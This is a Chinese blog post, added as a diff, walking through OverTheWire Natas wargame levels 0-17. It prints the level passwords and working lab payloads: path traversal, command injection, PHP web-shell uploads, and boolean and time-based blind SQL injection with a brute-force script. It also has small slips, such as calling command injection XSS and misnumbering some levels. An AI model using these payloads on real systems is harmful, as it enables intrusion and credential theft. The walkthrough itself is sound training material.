@@ -1,0 +1,458 @@
+---
+title: "Web安全入门靶场Natas通关详解(上)"
+date: "2022-06-07"
+tags: ['Web']
+draft: false
+summary: "本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的上半篇，主要包括第1-17关。"
+---
+
+
+简介：
+
+本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的上半篇，主要包括第1-17关。
+
+
+
+### Level 0-1 入门
+
+直接F12查看网页源码即可。
+
+### Level 2: 直接目录泄漏
+
+看到源码之后有`src="files/pixel.png"`的文件引用，说明该网站含有`./files`目录，猜测估计是信息泄漏漏洞。
+
+探索该目录，查看后发现果然`http://natas2.natas.labs.overthewire.org/files/users.txt`下保存着下一关的用户名密码。
+
+```
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+```
+
+### Level 3: robots.txt目录泄漏
+
+第三关中网页中提示`<!-- No more information leaks!! Not even Google will find it this time... -->`，说明Google等搜索引擎无法爬取到该页面。Google等搜索引擎在爬取网站时会遵循网络爬虫排除标准，也就是常说的爬虫协议。管理员可以在网站的robotic.txt文件中可以声明不希望或希望被爬虫爬取的网页，但是这个文件也常常成为泄漏网站目录结构的源头。
+
+在网站的根目录下查看robots.txt文件发现以下内容，指出该网站还存在`/s3cr3t/`隐藏目录。
+
+```
+User-agent: *
+Disallow: /s3cr3t/
+```
+
+在该目录下有看到了熟悉的user.txt文件，包含着下一关的用户名和密码。
+
+```
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+### Level 4: Referer来源审查绕过
+
+第4关中我们可以看到网页中提示`Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/",`说明该网站会对请求的来源进行审查。常用审查方式是通过请求头中的Referer字段，判断请求此网页的来源。
+
+因此，我使用burpsuite对请求包进行修改，然后绕过该审查。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/4-1.png)
+
+```
+natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+```
+
+### Level 5: Cookie登陆审查绕过
+
+第5关中，网页提示我没有登陆。查看请求头中的Cookie参数发现存在用于判断用户登陆与否的键`loggedin` .因此，直接对其值进行修改即可绕过。
+
+![5-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/5-1.png)
+
+```
+natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+```
+
+### Level 6: 信息验证泄漏
+
+第6关中，我们可以看到其给出了网页的源码，重要部分如下所示。
+
+```PHP
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+```
+
+我想此关卡想展示的内容是一种常见的密码或者重要信息验证的方式，从一个目录下引入包含硬编码验证信息的文件，再将其与用户所提交的内容进行比对。所以关键就是找到并破解这个硬编码的内容。当然，本关并没有涉及加密解密，所以提交`includes/secret.inc`中的内容即可。
+
+除此之外，`.inc`文件是一种包含文件，无关其真正的文件格式，可以理解为将`inc`文件的内容直接粘贴到引用文件的位置。
+
+```
+natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+
+### Level 7: 路径穿越
+
+第7关中，网页使用POST方法来获取所请求的页面，并根据该参数展示请求的页面。那么该源码可能会存在路径穿越漏洞。可以猜测，原PHP网页会首先将根目录与参数值进行拼接，然后调用`include()`, `require()`或者`fopen()`函数来展现该网页内容。
+
+所以，我们需要做的就是根据网页中的提示：`<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`来构造可以请求到该文件的参数。最简单的构造方式是使用`../`来回退到web根目录甚至系统的根目录，然后再写该目标路径。可以成功利用的构造请求如下所示。
+
+```
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../../etc/natas_webpass/natas8
+```
+
+此外需要说明的是，Linux系统下`/etc`目录通常是保存系统配置文件的目录，非常敏感。其中`/etc/httpd`则是包含了用于配置Apache Web服务器行为（特别是httpd守护进程）的一系列文件。
+
+```
+natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
+
+### Level 8: 信息验证绕过
+
+第8关是第6关的另一种表现形式。更多情况下，敏感信息并不会直接以明文的方式保存，而是以某种加密算法或者hash算法计算后的形式保存。所以在验证用户所提交的内容时，通常会采用相同的方式计算原提交内容，然后再比较。第8关中所展示的源码即此种信息验证方式，会将用户的输入进行base64加密、逆序再转成16进制的形式。
+
+```PHP
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+```
+
+因此，我们相当于求解方程，得到`$secret`的明文。所以我写了以下的一段php代码用于解密，并在本地自带的php环境下跑出结果。
+
+```PHP
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function decodeSecret($encodedSecret){
+    return base64_decode(strrev(hex2bin($encodedSecret)));
+}
+
+print decodeSecret($encodedSecret);
+
+?>
+```
+
+```
+natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+```
+
+### Level 9: XSS注入
+
+第9关是典型的XSS注入攻击，该网页代码从GET请求中获取待查询的内容，并直接拼接到系统命令中查询，再将结果返回给客户端。具体代码如下所示。
+
+```PHP
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+因此，我只需要截断`grep`命令并拼接寻找密码所在位置的命令即可。因此我构造了如下的请求，直接回显natas10的密码。
+
+```
+; cat ../../../../../etc/natas_webpass/natas9; 
+```
+
+```
+natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+```
+
+### Level 10: preg_match正则匹配绕过
+
+第10关在第9关的基础上增加了对用户输入内容的审查。查看给出的源代码，发现是使用preg_match函数对危险的字符模式`;|&`进行匹配，具体代码如下所示。
+
+```PHP
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+对于preg_match函数的绕过我们有以下几种思路：
+
+1. **尝试构造不含有黑名单字符的注入命令**。观察该正则模式，可以看到是对`;|&`这三种常见命令分隔字符进行匹配，因此我们需要构造避免使用黑名单字符完成命令注入的方式。下面对常用的可以作为命令注入的特殊字符进行介绍。
+
+    + `;`最常用的多命令分隔符。中间出现的错误不会影响接下来的命令执行；
+
+    + `&&`顺序执行被联立的多个命令，但是遇到错误会停止；
+
+    + `||`顺序尝试被联立的多个命令，直到遇到可以执行成功的命令停止;
+
+    + `|`管道机制，连结上个指令的标准输出，做为下个指令的标准输入；
+
+    + `&` 后台运行指令，表示将其后跟随的命令在后台执行；
+
+    + `<`标准输入重定向，从命令的执行结果或者文件输入；
+
+    + ``反引号表示命令引用，将其输出作为上级命令的输入；
+
+    + `$()`同样可以表示命令引用；
+
+    因此，我们可以尝试后三种方式注入命令。
+
+    ```
+    < $(ls /etc/natas_webpass/natas11)
+    . $(ls /etc/natas_webpass/natas11)
+    . `ls /etc/natas_webpass/natas11`
+    ```
+
+2. 利用原有的执行命令。我们可以看到原有执行命令就是grep，因此我们可以直接构造对目标文件的搜索。
+
+    ```
+    [a-zA-Z] /etc/natas_webpass/natas11
+    ```
+
+```
+natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+```
+
+### Level 11: XOR加密破解
+
+第11关给出的网站源码的程序逻辑如下所示。在初始情况，用户的`cookie`由`$defaultdata`经过`json_encode()`、`xor_encrypt()`以及`base64_encode()`生成，包含了是否展示当前密码以及当前背景蓝色两个键值对。当用户点击`set_color`后，该代码首先对用户传递的`cookie`中进行`base64_decode()`、`xor_encrypt()`以及`json_decode()`获取当前用户的信息，再根据用户传递的`POST`请求参数`bgColor`对当前用户的信息重新设置，并以相同的方式保存生成新的`cookie`。
+
+![11-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/11-1.png)
+
+由此可见，我们的目标则是生成`showpassword=yes`的`Cookie`代替原有请求中的`Cookie`。生成`Cookie`的方法即是源码中给出的`SaveData`方法，我们仅需要破解得到`xor_encrypt`函数中的`Key`。我们现在已知`$defaultdata`和其对应的`Cookie`，由于异或具有很好的性质即由`Y = X ^ Key`，可以得到`Key = Y ^X`，所以我构造了如下的函数来获取`Key`。
+
+```PHP
+function xor_encrypt_keyfinder($input, $output){
+	$key = '';
+	
+	for($i=0;$i<strlen($input);$i++) {
+    	$key .= $input[$i] ^ $output[$i];
+    }
+    
+	return $key;
+}
+
+$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+$cur_cookie = 'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw';
+echo xor_encrypt_keyfinder(json_encode($defaultdata), base64_decode($cur_cookie));
+```
+
+在得到Key之后，我们就可以计算出`"showpassword"=>"yes"`的`Cookie`并替换原有的`Cookie`。
+
+```PHP
+$manipulateddata = array("showpassword"=>"yes", "bgcolor"=>"#000000");
+echo base64_encode(xor_encrypt(json_encode($manipulateddata)));
+```
+
+```
+natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+```
+
+### Level 12: 文件上传漏洞
+
+第12关中网站源码如下图所示。首先初始情况下，网站为待上传的文件随机生成一个以.jpg结尾的文件名，并使用`multipart/form-data`方式来获取用户提交的文件。当服务器接受该请求后，会重新为该文件生成一个用户不可见的随机文件名，接着在将其复制到指定目录。由于本关是为了展示常见文件上传程序的逻辑，并不想在漏洞利用上刁难，所以会将最终生成文件路径返回给用户使其可以访问。
+
+![12-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/12-1.png)
+
+而且本关并没有在服务器端对文件后缀进行过滤或审查，因此我们可以直接上传一个php文件。不过需要注意的是，文件名的后缀默认为.jpg，所以我们需要将请求中的默认文件后缀进行修改。
+
+```
+<?php echo system("cat /etc/natas_webpass/natas13"); ?>
+```
+
+![12-2](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/12-2.png)
+
+```
+natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+```
+
+### Level 13: 文件上传exif_imagetype函数绕过
+
+第13关在第12关的基础上增加了对上传文件的审查，使用`exif_imagetype`函数对所上传文件的第一个字节来检查，判断其是否为一个正常的图片。
+
+因此我们可以在php文件的开头添加上正常图片的图片头然后再写入命令。需要注意的是，通常情况下我们的代码是通过`ASCII`或者`UTF-8`进行编码得到字节(二进制)的形式。而现在我们需要首先向二进制文件写入表示jpg格式的图片头字节，接着再写入经过`ASCII`编码后的PHP代码。
+
+```bash
+echo -e -n "\0xFF\0xD8\0xFF\0xE0\0x00\0x10\0x4A\0x46\0x49\0x46" > natas13.php
+echo '<?php echo system("cat /etc/natas_webpass/natas14"); ?>' >> natas13.php
+```
+
+其中`-e` 表示使能反斜杠转义，这样遇到`\`就会转义为二进制；`-n` 不添加行尾换行标识，因为默认的 echo 会在末尾添加 `0x0A`；双引号表示要转义的字符串，`\x`表示十六进制，`\0NNN` 表示八进制。
+
+![13](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/13.png)
+
+```
+natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
+
+### Level 14: SQL注入
+
+最简单的SQL注入，通过观看网站源码我们可以看到该动态网页会从将用户提交的用户名和密码输入生成SQL语句到数据库进行查询。具体的拼接的代码如下所示。
+
+```SQL
+SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"
+```
+
+首先，我们可以观察到查询字段的闭合符为双引号`"`。因此，我们有以下两种方式使得该查询语句语法正确并且查询成立。第一种方式是使用注释符`#`忽略语句后半部分内容，并加入`or`进行恒成立等式。具体地，username为`123" or 1=1#`；第二种方式可以避免使用注释符`#`,仍使用恒等式使得`and`前后的两句话均为真。具体地，username为`zhangsan" or "1"="1`, password为`xxx" or "1"="1`
+
+```SQL
+SELECT * from users where username="zhangsan" or 1=1# and password="xxx"
+SELECT * from users where username="zhangsan" or "1"="1" and password="xxx" or "1"="1"
+```
+
+```
+natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+```
+
+### Level 15: SQL布尔盲注
+
+第15关属于SQL的盲注，即**我们无法看到语句执行的结果，但是我们可以根据页面变化或者其他方式(执行时间)判断语句是否成功执行**。在此关中，当我们输入正确的用户名即natas16，页面会返回user does exists；而当语句执行结果为空NULL时，页面会返回user does not exists；如果语句语法错误，页面会返回Error in query。我们可以看到在源码中看到，数据库的users表中含有两列: username和password。不难看出我们需要使用SQL盲注的方式找出natas16对应的密码。我们可以看到服务器端SQL的查询语句如下所示。
+
+```SQL
+SELECT * from users where username=\"".$_REQUEST["username"]."\"
+```
+
+当我们输入`natas16`时，服务器端会执行`SELECT * from users where username="natas16"`，我们将返回得到用户存在的页面。接着，我们可以利用`AND`作为**开关函数**来试探**测试语句**的真伪，从而得到有用的信息。我们首先使用length函数探测该用户密码的长度，可以构造如下SQL查询语句。具体来讲，`and`在SQL查询语句的`where`关键词后用于连接不同的条件。我们在$\$1\$$处进行爆破，即可得到该用户密码的长度为32。
+
+```SQL
+SELECT * from users where username="natas16" and length(password)>$1$
+```
+
+![15](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/15.png)
+
+其中长度为1121是指页面返回`user does exists`即`and`后面的测试语句为真，而长度为1128是指页面返回`user does not exists.`，反之。
+
+在知道该password长度为32之后，我们继续爆破其密码本身。通过`substr()`和`ascii()`函数我们判断password每一位的字符的ascii码，具体命令如下所示。其中，`substr`函数的参数为(string, start, length)即返回字符串string以start为起始索引长度为length的字符串，`ascii`函数可以将其转换为ascii形式方便爆破。如下所示$\$1\$$$和\$2\$$位置分别指示密码各个位置以及对应的ascii码。我们继续使用burp suite进行爆破，其中模式需要选择Cluster Bomb(集合炸弹)，具体介绍可以参考[此帖子](https://www.cnblogs.com/yulia/p/7725018.html)。
+
+```SQL
+SELECT * from users where username="natas16" and ascii(substr((SELECT password from users where username="natas16"),$1$,1))=$2$#
+```
+
+接着我们可以得到password各个位置所对应ascii码，接着转换为字符形式即可。
+
+![15-2](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/15-2.png)
+
+```
+natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+此外，有关SQL盲注的内容可以前往[此帖子](https://www.anquanke.com/post/id/170626)学习。
+
+### Level 16: 命令注入之布尔盲注
+
+第16关属于第10关的进阶版，关键部分源代码如下所示。与第10关相比，第17关有两点不同。一是preg_match函数过滤了更多的字符包括`;`,`|`,`&`,反引号以及单双引号；二是我们的查询Key在passthru所执行的命令中被一对双引号包裹。 
+
+```PHP
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+```
+
+由于preg_match函数的过滤，我们可用于联合多个命令的方式还有`<`重定向以及`$()`命令引用。其次由于我们所执行的命令被引号包裹，而且引号在preg_match中被禁用，说明我们无法通过闭合引号来避免注入命令被当作字符串。**因此，我们只能选择`$()`方式注入命令，因为命令引用的良好特性，被括号包裹的命令总是最先被执行再返回，这也是非常好的突破引号的方式。**
+
+接下来我们可以看到，虽然`$()`可以被执行，但其返回结果还是作为字符串`Key`在`dictionary.txt`中查询，无法直接回显给我们。因此，我们需要开拓思路把SQL布尔盲注的思想借鉴过来，人为地制造开关函数并且逐步测试我们的目标字符串。具体构造有两种思路如下：
+
+1. 第一种思路是`Target[$position$]==$value$`，其中$$所包含的分别是目标字符串的位置和测试字符。在`bash`中有多种命令支持我们从文件打印指定位置的字符比如`awk`、`sed`、`cut`、`grep`、`dd`，对于字符串而言我们可以直接使用`${string:start:length}`获取，但是这些命令大多需要特殊字符的支持。
+
+    ```bash
+    cut -c 2 /etc/natas_webpass/natas17
+    pcregrep -o '(?<=^.{1}).{1}' /etc/natas_webpass/natas17 # pcre查询需要引号
+    dd bs=1 skip=0 count=1  if=/etc/natas_webpass/natas17 #会有额外输出
+    awk '{print substr($2)}' /etc/natas_webpass/natas17 # 需要引号
+    echo ${string:start:length} | $string='xxxxxxx' #针对字符串
+    ```
+
+    此外，在bash下直接比较字符串或者对应转化的编码比较困难。在本题中我没有找到特别好的方式来比较字符串，之后有机会再补充。如果不比较，而直接用原语句查询的话，数字是没有办法查到的，因为dictionary.txt中没有数字。
+
+    ```bash
+    grep -i "$(cut -c $1$ /etc/natas_webpass/natas17)" dictionary.txt
+    ```
+
+2. 第二种思路更加巧妙，可以表示为`find $value$ in Target`。其中value是逐渐累加的，也就是说首先猜第一个字符，然后把正确的第一个字符作为\$value\$前缀再去猜第二个字符，以此类推。还需要思考的是找到与否的结果需要再页面可以显示，也就是构造一个恰当的开关函数。本题中的构造方式如下：
+
+    首先`hacker`是dictionary.txt中的一个单词，因此当`$()`内的命令无返回值时，该语句的返回结果应该是`hacker`在`dictionary.txt`的查询结果。我们使用正则匹配去探测密码的每一位(\$a\$处为爆破位)，如果该密码确实是以a开头，则返回值将为整个密码。此时整个密码拼接至hacker后在dictionary.txt中查询肯定是空，所以返回页面将不同。
+
+    ```bash
+    grep -i "$(grep -E ^$a$.* /etc/natas_webpass/natas17)hacker" dictionary.txt
+    ```
+
+    具体的脚本如下所示。
+
+    ```python
+    #!/bin/python
+    import requests,string
+    
+    url = "http://natas16.natas.labs.overthewire.org"
+    auth_username = "natas16"
+    auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+    
+    characters = ''.join([string.ascii_letters,string.digits])
+    
+    password = []
+    for i in range(1,34):
+        for char in characters:
+            uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
+            r = requests.get(uri, auth=(auth_username,auth_password))
+            if 'hackers' not in r.text:
+                password.append(char)
+                print(''.join(password))
+                break
+            else: continue
+    ```
+
+```
+natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
+
+### Level 17: SQL时间盲注
+
+第17关与第15关的源代码几乎相同，只是在原有`echo`打印查询用户是否存在的代码被注释掉。因此，此关是一道基本的SQL时间盲注题，通过语句执行时间我们也可以知道该Query是否成功执行。
+
+**SQL时间注入的基本原理是在使用`where`进行条件筛选，使用`and`联立若干判断条件时，遇到第一个值为假或无返回值的条件则不再继续判断**。因此，我们可以使用以下语句来判断此关的数据表中是否存在用户名为`natas18`的用户。以下语句的执行时间为3s，因此我们可以判定`natas18`存在于该数据表中。
+
+```SQL
+SELECT * from users where username="natas18" and sleep(3)
+```
+
+接着，按照第17关的方式我们使用以下语句来爆破该用户的密码。
+
+```SQL
+SELECT * from users where username="natas18" and ascii(substr((SELECT password from users where username="natas18"),$1$,1))=$2$ and sleep(3)#
+```
+
+![17](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8A/17.png)
+
+根据response received time我们即可得到password的每个位置对应的字符的ascii码。
+
+```
+natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP 
+```
